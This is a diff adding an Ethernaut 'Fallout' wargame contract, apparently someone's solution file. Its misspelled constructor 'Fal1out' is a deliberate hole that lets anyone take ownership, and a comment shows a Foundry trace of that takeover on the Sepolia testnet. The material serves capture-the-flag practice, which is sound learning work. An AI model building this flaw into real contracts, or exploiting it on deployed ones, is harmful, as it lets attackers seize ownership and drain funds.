@@ -1,0 +1,106 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+//Claim ownership of the contract
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Fallout {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) allocations;
+    address payable public owner;
+
+    /* constructor */
+    function Fal1out() public payable { // change the  name  so now we can call the  constructor as it is normal  function now
+        owner = msg.sender;  // updates the owner    
+        allocations[owner] = msg.value;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function allocate() public payable {
+        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+    }
+
+    function sendAllocation(address payable allocator) public {
+        require(allocations[allocator] > 0);
+        allocator.transfer(allocations[allocator]);
+    }
+
+    function collectAllocations() public onlyOwner {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function allocatorBalance(address allocator) public view returns (uint256) {
+        return allocations[allocator];
+    }
+}
+
+/*PRIVATE_KEY --broadcast -vvvvutSolution.s.sol --rpc-url $RPC_URL --private-key $P
+[⠊] Compiling...
+No files changed, compilation skipped
+Traces:
+  [40443] FalloutSolution::run()
+    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::startBroadcast(<pk>)
+    │   └─ ← [Return]
+    ├─ [2382] 0xA0E1e8996409905f8d6904b31B6B69420Df2431C::owner() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ [0] console::log("Owner before:", 0x0000000000000000000000000000000000000000) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [22542] 0xA0E1e8996409905f8d6904b31B6B69420Df2431C::Fal1out()
+    │   └─ ← [Stop]
+    ├─ [382] 0xA0E1e8996409905f8d6904b31B6B69420Df2431C::owner() [staticcall]
+    │   └─ ← [Return] 0x06714e8c7641d35Bb3613af5E9e214C138707Bf5
+    ├─ [0] console::log("Owner after:", 0x06714e8c7641d35Bb3613af5E9e214C138707Bf5) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+
+Script ran successfully.
+
+== Logs ==
+  Owner before: 0x0000000000000000000000000000000000000000
+  Owner after: 0x06714e8c7641d35Bb3613af5E9e214C138707Bf5
+
+## Setting up 1 EVM.
+==========================
+Simulated On-chain Traces:
+
+  [24542] 0xA0E1e8996409905f8d6904b31B6B69420Df2431C::Fal1out()
+    └─ ← [Stop]
+
+
+==========================
+
+Chain 11155111
+
+Estimated gas price: 0.001000028 gwei
+
+Estimated total gas used for script: 62992
+
+Estimated amount required: 0.000000062993763776 ETH
+
+==========================
+
+##### sepolia
+✅  [Success] Hash: 0x6c5c93f2d07c49b0210749dd3389f3768205a42975ebee835f5961efc73fbc6e
+Block: 10432389
+Paid: 0.000000045606592878 ETH (45606 gas * 0.001000013 gwei)
+
+✅ Sequence #1 on sepolia | Total Paid: 0.000000045606592878 ETH (45606 gas * avg 0.001000013 gwei)
+                                                                                    
+
+==========================
+
+ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
+
+Transactions saved to: /home/srishti/Desktop/Ethernaut/Solutions/broadcast/FalloutSolution.s.sol/11155111/run-latest.json
+
+Sensitive values saved to: /home/srishti/Desktop/Ethernaut/Solutions/cache/FalloutSolution.s.sol/11155111/run-latest.json */
